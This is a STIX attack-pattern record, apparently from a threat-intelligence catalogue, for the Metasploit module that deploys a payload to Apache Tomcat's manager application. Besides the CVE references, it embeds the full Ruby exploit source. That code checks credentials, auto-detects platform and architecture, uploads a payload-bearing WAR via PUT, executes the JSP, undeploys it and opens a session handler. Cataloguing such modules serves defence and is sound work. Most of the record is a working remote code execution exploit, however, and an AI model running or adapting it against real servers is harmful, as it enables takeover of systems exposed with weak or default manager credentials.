{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f3d6a457-1bf7-4436-be1a-e1c28b5f499d",
    "created": "2024-08-14T17:08:36.672484Z",
    "modified": "2024-08-14T17:08:36.672489Z",
    "name": "Apache Tomcat Manager Application Deployer Authenticated Code Execution",
    "description": " This module can be used to execute a payload on Apache Tomcat servers that have an exposed \"manager\" application. The payload is uploaded as a WAR archive containing a jsp application using a PUT request.  The manager application can also be abused using /manager/html/upload, but that method is not implemented in this module.  NOTE: The compatible payload sets vary based on the selected target. For example, you must select the Windows target to use native Windows payloads. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/tomcat_mgr_deploy.rb",
            "external_id": "tomcat_mgr_deploy.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3843"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-4189"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-4188"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0557"
        },
        {
            "source_name": "reference",
            "url": "http://www-01.ibm.com/support/docview.wss?uid=swg21419179"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-4094"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3548"
        },
        {
            "source_name": "reference",
            "url": "http://tomcat.apache.org/tomcat-5.5-doc/manager-howto.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /Apache.*(Coyote|Tomcat)/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Apache Tomcat Manager Application Deployer Authenticated Code Execution',\n      'Description'    => %q{\n          This module can be used to execute a payload on Apache Tomcat servers that\n        have an exposed \"manager\" application. The payload is uploaded as a WAR archive\n        containing a jsp application using a PUT request.\n\n        The manager application can also be abused using /manager/html/upload, but that\n        method is not implemented in this module.\n\n        NOTE: The compatible payload sets vary based on the selected target. For\n        example, you must select the Windows target to use native Windows payloads.\n      },\n      'Author'      => [ 'jduck' ],\n      'License'        => MSF_LICENSE,\n      'References'  =>\n        [\n          # There is no single vulnerability associated with deployment functionality.\n          # Instead, the focus has been on insecure/blank/hardcoded default passwords.\n\n          # The following references refer to HP Operations Manager\n          [ 'CVE', '2009-3843' ],\n          [ 'OSVDB', '60317' ],\n          [ 'CVE', '2009-4189' ],\n          [ 'OSVDB', '60670' ],\n\n          # HP Operations Dashboard\n          [ 'CVE', '2009-4188' ],\n\n          # IBM Cognos Express Default user/pass\n          [ 'BID', '38084' ],\n          [ 'CVE', '2010-0557' ],\n          [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21419179' ],\n\n          # IBM Rational Quality Manager and Test Lab Manager\n          [ 'CVE', '2010-4094' ],\n          [ 'ZDI', '10-214' ],\n\n          # 'admin' password is blank in default Windows installer\n          [ 'CVE', '2009-3548' ],\n          [ 'OSVDB', '60176' ],\n          [ 'BID', '36954' ],\n\n          # tomcat docs\n          [ 'URL', 'http://tomcat.apache.org/tomcat-5.5-doc/manager-howto.html' ]\n        ],\n      'Platform'    => %w{ java linux win }, # others?\n      'Targets'     =>\n        [\n          #\n          # detect via /manager/serverinfo\n          #\n          # do target detection but java meter by default\n          [ 'Automatic',\n            {\n              'Arch' => ARCH_JAVA,\n              'Platform' => 'java'\n            }\n          ],\n          [ 'Java Universal',\n            {\n              'Arch' => ARCH_JAVA,\n              'Platform' => 'java'\n            },\n          ],\n\n          #\n          # Platform specific targets only\n          #\n          [ 'Windows Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win'\n            },\n          ],\n\n          [ 'Linux x86',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux'\n            },\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-11-09'))\n\n    register_options(\n      [\n        OptString.new('HttpUsername', [ false, 'The username to authenticate as' ]),\n        OptString.new('HttpPassword', [ false, 'The password for the specified username' ]),\n        # /cognos_express/manager/ for Cognos Express (19300)\n        OptString.new('PATH', [ true,  \"The URI path of the manager app (/deploy and /undeploy will be used)\", '/manager'])\n      ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def check\n    res = query_serverinfo\n    disconnect\n    return CheckCode::Unknown if res.nil?\n    if (res.code.between?(400, 499))\n      vprint_error(\"Server rejected the credentials\")\n      return CheckCode::Unknown\n    end\n\n    store_valid_credential(user: datastore['HttpUsername'], private: datastore['HttpPassword'])\n\n    vprint_status(\"Target is #{detect_platform(res.body)} #{detect_arch(res.body)}\")\n    return CheckCode::Appears\n  end\n\n  def auto_target\n    print_status(\"Attempting to automatically select a target...\")\n\n    res = query_serverinfo()\n    return nil if not res\n\n    plat = detect_platform(res.body)\n    arch = detect_arch(res.body)\n\n    # No arch or platform found?\n    if (not arch or not plat)\n      return nil\n    end\n\n    # see if we have a match\n    targets.each { |t|\n      if (t['Platform'] == plat) and (t['Arch'] == arch)\n        return t\n      end\n    }\n\n    # no matching target found\n    return nil\n  end\n\n\n  def exploit\n    mytarget = target\n    if (target.name =~ /Automatic/)\n      mytarget = auto_target\n      if (not mytarget)\n        fail_with(Failure::NoTarget, \"Unable to automatically select a target\")\n      end\n      print_status(\"Automatically selected target \\\"#{mytarget.name}\\\"\")\n    else\n      print_status(\"Using manually select target \\\"#{mytarget.name}\\\"\")\n    end\n\n    # We must regenerate the payload in case our auto-magic changed something.\n    p = exploit_regenerate_payload(mytarget.platform, mytarget.arch)\n\n    # Generate the WAR containing the EXE containing the payload\n    jsp_name = rand_text_alphanumeric(4+rand(32-4))\n    app_base = rand_text_alphanumeric(4+rand(32-4))\n\n    # Generate the WAR containing the payload\n    war = p.encoded_war({\n        :app_name => app_base,\n        :jsp_name => jsp_name,\n        :arch => mytarget.arch,\n        :platform => mytarget.platform\n      }).to_s\n\n    query_str = \"?path=/\" + app_base\n\n    #\n    # UPLOAD\n    #\n    path_tmp = normalize_uri(datastore['PATH'], \"deploy\") + query_str\n    print_status(\"Uploading #{war.length} bytes as #{app_base}.war ...\")\n    res = send_request_cgi({\n      'uri'          => path_tmp,\n      'method'       => 'PUT',\n      'ctype'        => 'application/octet-stream',\n      'data'         => war,\n    }, 20)\n    if (! res)\n      fail_with(Failure::Unknown, \"Upload failed on #{path_tmp} [No Response]\")\n    end\n    if (res.code < 200 or res.code >= 300)\n      case res.code\n      when 401\n        print_warning(\"Warning: The web site asked for authentication: #{res.headers['WWW-Authenticate'] || res.headers['Authentication']}\")\n      end\n      fail_with(Failure::Unknown, \"Upload failed on #{path_tmp} [#{res.code} #{res.message}]\")\n    end\n\n    store_valid_credential(user: datastore['HttpUsername'], private: datastore['HttpPassword'])\n\n    #\n    # EXECUTE\n    #\n    jsp_path = '/' + app_base + '/' + jsp_name + '.jsp'\n    print_status(\"Executing #{jsp_path}...\")\n    res = send_request_cgi({\n      'uri'          => jsp_path,\n      'method'       => 'GET'\n    }, 20)\n\n    if (! res)\n      print_error(\"Execution failed on #{app_base} [No Response]\")\n    elsif (res.code < 200 or res.code >= 300)\n      print_error(\"Execution failed on #{app_base} [#{res.code} #{res.message}]\")\n      vprint_status(res.body)\n    end\n\n    #\n    # DELETE\n    #\n    path_tmp = normalize_uri(datastore['PATH'], \"/undeploy\") + query_str\n    print_status(\"Undeploying #{app_base} ...\")\n    res = send_request_cgi({\n      'uri'          => path_tmp,\n      'method'       => 'GET'\n    }, 20)\n    if (! res)\n      print_warning(\"WARNING: Undeployment failed on #{path_tmp} [No Response]\")\n    elsif (res.code < 200 or res.code >= 300)\n      print_warning(\"Deletion failed on #{path_tmp} [#{res.code} #{res.message}]\")\n    end\n\n    handler\n  end\n\n  def query_serverinfo()\n    path = normalize_uri(datastore['PATH'], '/serverinfo')\n    res = send_request_raw(\n      {\n        'uri'   => path\n      }, 10)\n\n    if (not res) or (res.code != 200)\n      print_error(\"Failed: Error requesting #{path}\")\n      return nil\n    end\n\n    vprint_status(res.body)\n\n    return res\n  end\n\n  def detect_platform(body = nil)\n    if not body\n      res = query_serverinfo()\n      return nil if not res\n      body = res.body\n    end\n\n    body.each_line { |ln|\n      ln.chomp!\n\n      case ln\n      when /OS Name: /\n        os = ln.split(':')[1]\n        case os\n        when /Windows/\n          return 'win'\n\n        when /Linux/\n          return 'linux'\n\n        end\n      end\n    }\n  end\n\n  def detect_arch(body)\n    body.each_line { |ln|\n      ln.chomp!\n\n      case ln\n      when /OS Architecture: /\n        ar = ln.split(':')[1].strip\n        case ar\n        when 'x86', 'i386', 'i686'\n          return ARCH_X86\n\n        when 'x86_64', 'amd64'\n          return ARCH_X64\n\n        end\n      end\n    }\n  end\n\n  def service_details\n    super.merge({ access_level: 'Admin' })\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-11-09",
    "x_mitre_platforms": [
        "linux"
    ]
}